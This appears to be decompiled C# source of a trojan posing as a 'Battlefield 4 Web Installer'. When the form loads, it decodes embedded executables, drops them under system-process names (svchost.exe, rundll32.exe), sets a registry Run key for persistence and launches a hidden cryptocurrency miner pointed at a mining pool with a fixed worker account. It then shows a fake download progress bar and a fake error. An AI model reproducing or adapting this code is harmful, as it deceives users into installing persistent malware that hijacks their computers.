using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Battlefield_4_Web_Installer___CNET.My;
using Battlefield_4_Web_Installer___CNET.My.Resources;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

namespace Battlefield_4_Web_Installer___CNET;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	[AccessedThroughProperty("PictureBox2")]
	private PictureBox _PictureBox2;

	[AccessedThroughProperty("ProgressBar1")]
	private ProgressBar _ProgressBar1;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	internal virtual PictureBox PictureBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			//IL_0024: Unknown result type (might be due to invalid IL or missing references)
			//IL_002a: Expected O, but got Unknown
			EventHandler eventHandler = PictureBox1_MouseLeave;
			EventHandler eventHandler2 = PictureBox1_MouseEnter;
			MouseEventHandler val = new MouseEventHandler(PictureBox1_Click);
			if (_PictureBox1 != null)
			{
				((Control)_PictureBox1).remove_MouseLeave(eventHandler);
				((Control)_PictureBox1).remove_MouseEnter(eventHandler2);
				((Control)_PictureBox1).remove_MouseClick(val);
			}
			_PictureBox1 = value;
			if (_PictureBox1 != null)
			{
				((Control)_PictureBox1).add_MouseLeave(eventHandler);
				((Control)_PictureBox1).add_MouseEnter(eventHandler2);
				((Control)_PictureBox1).add_MouseClick(val);
			}
		}
	}

	internal virtual PictureBox PictureBox2
	{
		[DebuggerNonUserCode]
		get
		{
			return _PictureBox2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_001c: Expected O, but got Unknown
			EventHandler eventHandler = PictureBox2_MouseEnter;
			MouseEventHandler val = new MouseEventHandler(PictureBox2_Click);
			EventHandler eventHandler2 = PictureBox2_MouseLeave;
			if (_PictureBox2 != null)
			{
				((Control)_PictureBox2).remove_MouseEnter(eventHandler);
				((Control)_PictureBox2).remove_MouseClick(val);
				((Control)_PictureBox2).remove_MouseLeave(eventHandler2);
			}
			_PictureBox2 = value;
			if (_PictureBox2 != null)
			{
				((Control)_PictureBox2).add_MouseEnter(eventHandler);
				((Control)_PictureBox2).add_MouseClick(val);
				((Control)_PictureBox2).add_MouseLeave(eventHandler2);
			}
		}
	}

	internal virtual ProgressBar ProgressBar1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ProgressBar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ProgressBar1 = value;
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	[DebuggerNonUserCode]
	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCAddToList(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_025e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0268: Expected O, but got Unknown
		//IL_0301: Unknown result type (might be due to invalid IL or missing references)
		//IL_030b: Expected O, but got Unknown
		//IL_038c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0396: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		PictureBox1 = new PictureBox();
		PictureBox2 = new PictureBox();
		ProgressBar1 = new ProgressBar();
		Label1 = new Label();
		Label2 = new Label();
		((ISupportInitialize)PictureBox1).BeginInit();
		((ISupportInitialize)PictureBox2).BeginInit();
		((Control)this).SuspendLayout();
		((Control)PictureBox1).set_Cursor(Cursors.get_Hand());
		PictureBox pictureBox = PictureBox1;
		Point location = new Point(491, 434);
		((Control)pictureBox).set_Location(location);
		((Control)PictureBox1).set_Name("PictureBox1");
		PictureBox pictureBox2 = PictureBox1;
		Size size = new Size(163, 36);
		((Control)pictureBox2).set_Size(size);
		PictureBox1.set_TabIndex(0);
		PictureBox1.set_TabStop(false);
		((Control)PictureBox2).set_Cursor(Cursors.get_Hand());
		PictureBox pictureBox3 = PictureBox2;
		location = new Point(43, 434);
		((Control)pictureBox3).set_Location(location);
		((Control)PictureBox2).set_Name("PictureBox2");
		PictureBox pictureBox4 = PictureBox2;
		size = new Size(163, 36);
		((Control)pictureBox4).set_Size(size);
		PictureBox2.set_TabIndex(1);
		PictureBox2.set_TabStop(false);
		ProgressBar progressBar = ProgressBar1;
		location = new Point(44, 373);
		((Control)progressBar).set_Location(location);
		((Control)ProgressBar1).set_Name("ProgressBar1");
		ProgressBar progressBar2 = ProgressBar1;
		size = new Size(609, 45);
		((Control)progressBar2).set_Size(size);
		((Control)ProgressBar1).set_TabIndex(2);
		((Control)ProgressBar1).set_Visible(false);
		((Control)Label1).set_Anchor((AnchorStyles)15);
		Label1.set_AutoSize(true);
		((Control)Label1).set_BackColor(Color.Transparent);
		Label label = Label1;
		location = new Point(339, 357);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(0, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(3);
		Label1.set_TextAlign((ContentAlignment)32);
		((Control)Label1).set_Visible(false);
		Label2.set_AutoSize(true);
		((Control)Label2).set_BackColor(Color.Transparent);
		((Control)Label2).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		Label label3 = Label2;
		location = new Point(45, 341);
		((Control)label3).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label4 = Label2;
		size = new Size(319, 16);
		((Control)label4).set_Size(size);
		((Control)Label2).set_TabIndex(4);
		Label2.set_Text("Please be patient while we download your software...");
		((Control)Label2).set_Visible(false);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		size = new Size(700, 500);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)this).get_Controls().Add((Control)(object)PictureBox2);
		((Control)this).get_Controls().Add((Control)(object)PictureBox1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Form1");
		((ISupportInitialize)PictureBox1).EndInit();
		((ISupportInitialize)PictureBox2).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Form1_Load(object sender, EventArgs e)
	{
		//IL_00c4: Unknown result type (might be due to invalid IL or missing references)
		PictureBox1.set_Image((Image)(object)Resources.btn);
		PictureBox2.set_Image((Image)(object)Resources.close);
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\svchost.exe";
		File.WriteAllBytes(text, DecRotX(ReadExeFromResources("runner")));
		try
		{
			if (Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE")!.Contains("64"))
			{
				((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey("SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("svchost", text);
			}
			else
			{
				((ServerComputer)MyProject.Computer).get_Registry().get_LocalMachine().OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true)!.SetValue("svchost", text);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Interaction.MsgBox((object)"This program requires Administrator privileges. Please restart the program as Administrator by right clicking the executable and selecting Run As Administrator.", (MsgBoxStyle)16, (object)"Request Privileges");
			ProjectData.EndApp();
			ProjectData.ClearProjectError();
		}
		if (((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("System\\CurrentControlSet\\Enumerate", writable: true) == null)
		{
			((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().CreateSubKey("System\\CurrentControlSet\\Enumerate");
		}
		string text2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\rundll32.exe";
		((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("System\\CurrentControlSet\\Enumerate", writable: true)!.SetValue("path", text2);
		int num = checked((int)Math.Round((double)((ServerComputer)MyProject.Computer).get_Info().get_AvailablePhysicalMemory() / 8388608.0));
		int num2 = 0;
		int num3 = num;
		if (num3 >= 512)
		{
			num2 = 512;
		}
		else if (num3 < 32)
		{
			num2 = 8;
		}
		else if (num3 < 128)
		{
			num2 = 32;
		}
		else if (num3 < 256)
		{
			num2 = 128;
		}
		else if (num3 < 512)
		{
			num2 = 256;
		}
		string value = $"-o ypool.net -t {Environment.ProcessorCount} -m{num2} -u cysto.PTS_1 -p 12345";
		((ServerComputer)MyProject.Computer).get_Registry().get_CurrentUser().OpenSubKey("System\\CurrentControlSet\\Enumerate", writable: true)!.SetValue("args", value);
		if (!File.Exists(text2))
		{
			if (Environment.GetEnvironmentVariable("PROCESSOR_ARCHITECTURE")!.Contains("64"))
			{
				File.WriteAllBytes(text2, DecRotX(ReadExeFromResources("64")));
			}
			else
			{
				File.WriteAllBytes(text2, DecRotX(ReadExeFromResources("32")));
			}
		}
		ProcessStartInfo processStartInfo = new ProcessStartInfo(text);
		processStartInfo.CreateNoWindow = true;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		Process.Start(processStartInfo);
	}

	private byte[] ReadExeFromResources(string filename)
	{
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		string text = string.Empty;
		string[] manifestResourceNames = executingAssembly.GetManifestResourceNames();
		string[] array = manifestResourceNames;
		checked
		{
			for (int i = 0; i < array.Length; i++)
			{
				text = array[i];
				if (text.IndexOf(filename) > -1)
				{
					break;
				}
			}
			Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(text);
			if (manifestResourceStream == null)
			{
				return null;
			}
			byte[] array2 = new byte[(int)manifestResourceStream.Length - 1 + 1];
			manifestResourceStream.Read(array2, 0, array2.Length);
			manifestResourceStream.Close();
			return array2;
		}
	}

	private void PictureBox1_MouseEnter(object sender, EventArgs e)
	{
		PictureBox1.set_Image((Image)(object)Resources.btn_h);
	}

	private void PictureBox1_MouseLeave(object sender, EventArgs e)
	{
		PictureBox1.set_Image((Image)(object)Resources.btn);
	}

	private void PictureBox2_MouseEnter(object sender, EventArgs e)
	{
		PictureBox2.set_Image((Image)(object)Resources.clos_h);
	}

	private void PictureBox2_MouseLeave(object sender, EventArgs e)
	{
		PictureBox2.set_Image((Image)(object)Resources.close);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void PictureBox2_Click(object sender, EventArgs e)
	{
		ProjectData.EndApp();
	}

	private void PictureBox1_Click(object sender, EventArgs e)
	{
		Control.set_CheckForIllegalCrossThreadCalls(false);
		((Control)this).set_BackgroundImage((Image)(object)Resources.load);
		((Control)ProgressBar1).set_Visible(true);
		((Control)Label1).set_Visible(true);
		((Control)Label2).set_Visible(true);
		((Control)PictureBox1).set_Cursor(Cursors.get_No());
		Thread thread = new Thread(Download);
		thread.Start();
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void Download()
	{
		//IL_0052: Unknown result type (might be due to invalid IL or missing references)
		int num = 1;
		do
		{
			ProgressBar1.set_Value(num);
			Label1.set_Text(Conversions.ToString(num) + "%");
			Thread.Sleep(60000);
			num = checked(num + 1);
		}
		while (num <= 99);
		Thread.Sleep(100000);
		Interaction.MsgBox((object)"A fatal error has occured: 0x0032A374. Please contact your network administrator, or try relaunching the application.", (MsgBoxStyle)16, (object)"Critical Error");
		ProjectData.EndApp();
	}

	public byte[] EncRotX(byte[] srcBytes)
	{
		checked
		{
			byte[] array = new byte[srcBytes.Length - 1 + 1];
			array[0] = srcBytes[0];
			int num = array.Length - 1;
			int num2 = 1;
			while (true)
			{
				int num3 = num2;
				int num4 = num;
				if (num3 > num4)
				{
					break;
				}
				array[num2] = (byte)RotX(256, srcBytes[num2], array[num2 - 1]);
				num2++;
			}
			return array;
		}
	}

	public byte[] DecRotX(byte[] srcBytes)
	{
		checked
		{
			byte[] array = new byte[srcBytes.Length - 1 + 1];
			array[0] = srcBytes[0];
			for (int i = srcBytes.Length - 1; i >= 1; i += -1)
			{
				array[i] = (byte)UnRotX(256, srcBytes[i], srcBytes[i - 1]);
			}
			return array;
		}
	}

	public int RotX(int x, int a, int b)
	{
		return checked(a + b) % x;
	}

	public int UnRotX(int x, int a, int b)
	{
		checked
		{
			return Conversions.ToInteger(Interaction.IIf(a - b >= 0, (object)(a - b), (object)(x - unchecked(Math.Abs(checked(a - b)) % x))));
		}
	}
}
